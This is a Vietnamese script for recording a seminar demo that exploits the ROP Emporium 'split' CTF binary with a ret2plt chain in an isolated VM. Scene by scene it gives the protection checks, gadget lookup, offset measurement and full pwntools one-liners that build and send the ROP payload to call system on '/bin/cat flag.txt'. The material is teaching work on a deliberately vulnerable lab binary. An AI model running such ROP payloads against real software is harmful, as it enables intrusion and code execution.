# Kịch bản quay video demo S05 — `split` x86_64 (ret2plt / ret2libc)

Viết cho: **người trình bày tự quay màn hình demo** (bạn), để phát trong seminar
hoặc nộp kèm. Bám đúng lệnh đã xác minh trong [lenh_demo.md](lenh_demo.md) và số liệu
thật trong [ket_qua_demo.md](ket_qua_demo.md). Không thêm lệnh chưa chạy.

> Quay trong **VM Kali amd64 (UTM) cô lập** — đúng ràng buộc an toàn của AGENT.md.
> Video này còn dùng làm **bản dự phòng** nếu demo trực tiếp bị chậm/lỗi lúc thuyết trình.

---

## 0. Chuẩn bị trước khi bấm ghi (làm 1 lần)

- [ ] Vào thư mục làm việc và kiểm tra đủ file:
  ```bash
  cd ~/s05_split
  ls -l split flag.txt exploit.py
  ```
- [ ] **Điền OFFSET vào exploit.py**: mở file, sửa dòng `OFFSET = None` thành `OFFSET = 40`
  (đã đo 2026-11-05). Nếu để `None`, Cảnh 5 sẽ báo lỗi assert.
- [ ] Chạy thử TRỌN kịch bản một lượt KHÔNG quay, để chắc mọi lệnh ra đúng (đặc biệt
  `python3 exploit.py` phải in `ROPE{...}`). Quay chỉ khi lượt chạy thử sạch.
- [ ] Dọn màn hình: đóng tab thừa, xoá lịch sử rối nếu muốn (`clear`), phóng to font
  terminal (18–22pt) để video đọc được. Nền terminal tối, chữ sáng.
- [ ] Tắt thông báo hệ thống / popup trong VM.
- [ ] Chuẩn bị sẵn **payload.bin** cho Cảnh 7 (tạo ở Bước 7 của lenh_demo.md), hoặc
  để lệnh tự tạo trong cảnh.

### Công cụ ghi
- Trong VM: `simplescreenrecorder` hoặc `OBS Studio` (ghi vùng cửa sổ terminal + mic).
- Hoặc ghi từ máy host: UTM → quay cả cửa sổ VM bằng screen recorder của macOS
  (`Shift+Cmd+5`). Cách này mượt hơn khi VM yếu.
- **Âm thanh:** thu lời giảng trực tiếp, hoặc quay câm rồi lồng tiếng sau. Nếu lồng
  sau, gõ lệnh chậm để có thời gian khớp lời.

### Thời lượng mục tiêu
~**5–6 phút**. Khi dựng, có thể tua nhanh (1.5–2×) các đoạn gõ lệnh dài; giữ nguyên
tốc độ ở đoạn ra flag và đoạn GDB.

---

## Kịch bản theo cảnh

Mỗi cảnh: **LỜI NÓI** (đọc) · **GÕ** (thao tác trên terminal) · **CẦN THẤY** (khung hình
phải bắt được — cũng chính là ảnh minh chứng tương ứng).

---

### Cảnh 1 — Giới thiệu challenge (≈45s, slide 7, CHƯA mở lệnh exploit)

**LỜI NÓI:**
> "Đây là `split`, một challenge của ROP Emporium — nền tảng học ROP hợp pháp, chạy
> trong VM cô lập. Mục tiêu: đọc `flag.txt`, thứ chương trình bình thường không cho xem.
> Tên 'split' vì binary để sẵn hai mảnh của một câu lệnh — một lời gọi `system()` và
> một chuỗi `/bin/cat flag.txt` — nhưng tách rời. Việc của ta là ghép lại bằng điều
> khiển luồng. Vì NX bật nên không nhét được shellcode — buộc phải tái sử dụng `system`
> có sẵn. Đó chính là ret2libc thu nhỏ."

**GÕ:**
```bash
file split            # binary ta tấn công
ls -l flag.txt        # mục tiêu: làm chương trình tự đọc file này ra
```
**CẦN THẤY:** dòng `ELF 64-bit ... x86-64`, và flag.txt tồn tại (chưa cat nội dung).

---

### Cảnh 2 — "Được phép lái kiểu nào?" checksec + ASLR (≈40s) → **ảnh 01**

**LỜI NÓI:**
> "Trước tiên xem các lớp bảo vệ. `checksec` cho thấy NX bật, không canary, No PIE —
> địa chỉ code cố định. ASLR hệ thống đang bằng 2, tức bật đầy đủ. Kết luận: không
> shellcode được, nhưng vì No PIE nên gadget và PLT ở địa chỉ biết trước. Hướng khai
> thác là ret2plt."

**GÕ:**
```bash
checksec --file=split
cat /proc/sys/kernel/randomize_va_space
```
**CẦN THẤY:** `NX enabled` · `No PIE` · `No canary` · số `2`.

---

### Cảnh 3 — Hành vi bình thường vs input dài (≈35s) → **ảnh 02**

**LỜI NÓI:**
> "Đây chỉ là 'ảnh trước' để đối chiếu, chưa phải bằng chứng lỗi: input ngắn chạy êm.
> Nhưng input dài làm chương trình crash — segfault. Đó là dấu hiệu ta ghi đè được dữ
> liệu điều khiển trên stack."

**GÕ:**
```bash
echo "hello" | ./split
python3 -c "print('A'*100)" | ./split; echo "exit=$?"
```
**CẦN THẤY:** lần đầu chạy bình thường; lần sau exit khác 0 / báo segfault.

---

### Cảnh 4 — Nguyên liệu có sẵn trong binary (≈45s) → **ảnh 03**

**LỜI NÓI:**
> "Ba nguyên liệu cần thu: hàm `system@plt` để gọi; gadget `pop rdi; ret` để đặt đối
> số vào RDI theo ABI x86-64; và con trỏ tới chuỗi `/bin/cat flag.txt` có sẵn trong
> .data. Cả ba cố định được nhờ No PIE. Đây chính là ba giá trị mà exploit.py tự lấy."

**GÕ:**
```bash
objdump -d split | grep -A1 "<system@plt>:" | head
ROPgadget --binary split | grep "pop rdi ; ret"
ROPgadget --binary split --string "/bin/cat flag.txt"
```
**CẦN THẤY:** `system@plt=0x400560`, `pop rdi ; ret=0x4007c3`, chuỗi tại `0x601060`.

---

### Cảnh 5 — "Vô-lăng ở đâu?" đo offset (≈30s) → **ảnh 04**

**LỜI NÓI:**
> "Thứ duy nhất phải đo là offset từ đầu input tới địa chỉ trả về đã lưu. Dùng chuỗi
> cyclic, khi crash đọc giá trị RIP rồi tra ngược. Kết quả: 40 byte. Đo trên chính
> binary này, không đoán."

**GÕ:**
```bash
ulimit -c unlimited
python3 exploit.py offset
```
**CẦN THẤY:** dòng `Offset tới saved RIP = 40`.

---

### Cảnh 6 — Đọc exploit rồi chạy ra flag, LẶP 2 LẦN (≈1p30) → **ảnh 05/06 + run_log.txt**

> Cảnh quan trọng nhất. Chạy 2 lần liên tiếp để thoả yêu cầu đề "hai lần liên tiếp".

**LỜI NÓI (phần đọc file):**
> "Minh bạch: đây là đúng file sắp chạy. Payload = 40 byte đệm, một `ret` căn lề 16-byte
> cho `movaps`, gadget `pop rdi; ret`, con trỏ chuỗi lệnh, rồi `system@plt`."

**GÕ (5a — xem file):**
```bash
batcat --paging=never exploit.py 2>/dev/null || cat -n exploit.py
```
Chỉ tay (con trỏ) vào các dòng: `pop rdi`, `system@plt`, `usefulString`.

**LỜI NÓI (phần chạy):**
> "Chạy. Nó in các địa chỉ nó tự phân giải, rồi ra nội dung flag."

**GÕ (5b — chạy lần 1):**
```bash
python3 exploit.py
```
Khi hiện flag → `Ctrl+C` để thoát interactive.

**GÕ (lặp 2 lần tự động, ghi log):**
```bash
for i in 1 2; do echo "===== RUN $i ====="; python3 -c "
from pwn import *
context.log_level='warn'
elf=context.binary=ELF('./split'); rop=ROP(elf)
payload=b'A'*40+p64(rop.find_gadget(['ret'])[0])+p64(rop.find_gadget(['pop rdi','ret'])[0])+p64(elf.symbols['usefulString'])+p64(elf.plt['system'])
p=process('./split'); p.sendline(payload); print(p.recvall(timeout=3).decode(errors='replace'))
"; done | tee run_log.txt
grep -c "ROPE{" run_log.txt   # phải ra 2
```
**CẦN THẤY:** `ROPE{a_placeholder_32byte_flag!}` xuất hiện, và dòng cuối `grep -c` in **2**.

---

### Cảnh 7 — Nhìn tận mắt trong GDB: đối số đúng (≈1p) → **ảnh 05 (GDB)**

**LỜI NÓI:**
> "Ra flag chưa đủ — ta xem tận mắt. Đặt breakpoint tại `system`, chạy với payload.
> RDI phải trỏ đúng chuỗi `/bin/cat flag.txt`, và RSP tận cùng 8 nghĩa là đã căn lề
> 16-byte đúng. Lưu ý: địa chỉ libc chỉ thấy được vì GDB tắt ASLR — đây là lab, không
> phải exploit tự rò địa chỉ."

**GÕ:**
```bash
python3 -c "
from pwn import *
context.arch='amd64'; elf=ELF('./split'); rop=ROP(elf)
payload=b'A'*40+p64(rop.find_gadget(['ret'])[0])+p64(rop.find_gadget(['pop rdi','ret'])[0])+p64(elf.symbols['usefulString'])+p64(elf.plt['system'])
open('payload.bin','wb').write(payload)"
gdb -q -batch -ex "break system" -ex "run < payload.bin" \
  -ex 'x/s $rdi' -ex 'info registers rdi rsp rip' ./split
```
**CẦN THẤY:** `0x601060 ...: "/bin/cat flag.txt"`, `rdi 0x601060`, dừng `in system ()`,
`rsp` kết thúc bằng `8`.

---

### Cảnh 8 — Chốt mức bằng chứng (≈30s, có thể để trên slide)

**LỜI NÓI:**
> "Thang bằng chứng: ghi vượt → crash → chiếm luồng, RIP là giá trị ta đặt → gọi
> `system` đúng đối số, RDI trỏ chuỗi → đạt mục tiêu CTF, ra flag. Nhưng dùng
> `system@plt` cố định do No PIE **không** chứng minh đã tìm libc base hay vượt ASLR
> của libc. Đây là ret2plt; direct ret2libc là nhánh mở rộng."

**CẦN THẤY:** (tuỳ chọn) slide thang bằng chứng, hoặc chỉ giọng nói trên khung terminal.

---

## Mẹo quay & xử lý sự cố

- **Gõ chậm, dừng 1 nhịp sau mỗi output** để người xem (và lời lồng tiếng) kịp theo.
- Nếu một lệnh ra sai: đừng xoá giữa chừng — dừng ghi, sửa, quay lại **từ đầu cảnh đó**
  (dựng ghép từng cảnh dễ hơn quay một mạch).
- `python3 exploit.py` treo ở interactive là **bình thường** — đó là shell của `system`;
  `Ctrl+C` để thoát. Nói rõ điều này nếu để trong video.
- Nếu VM quá chậm làm con trỏ giật: quay từng cảnh ngắn rồi ghép; hoặc ghi màn hình từ
  host (macOS `Shift+Cmd+5`).
- Nếu flag **không ra**: kiểm (1) đứng đúng `~/s05_split`, (2) `flag.txt` tồn tại,
  (3) đã điền `OFFSET = 40`. Không "diễn" kết quả — nếu không ra thật thì không quay đoạn đó.

---

## Sau khi quay (bắt buộc, theo quy ước bằng chứng)

- [ ] Lưu video vào nơi bền (không để trong scratchpad). Đặt tên rõ: `demo_split_YYYYMMDD.mp4`.
- [ ] Trích các khung hình làm ảnh minh chứng `evidence/01..06_*.png` + ghi chú trong
  `evidence/README.md` (ảnh chứng minh điều gì, lệnh nào, ngày nào).
- [ ] Cập nhật [ket_qua_demo.md](ket_qua_demo.md): đổi "Lần 2: CHƯA CHẠY" thành kết quả
  thật từ `run_log.txt`, tick mục "chạy lặp lần 2".
- [ ] Giữ `run_log.txt` làm log kèm theo.
- [ ] Ghi môi trường: `uname -m`, phiên bản `pwntools`/`gdb`/`checksec` (đã có trong
  ket_qua_demo.md — xác nhận không đổi).
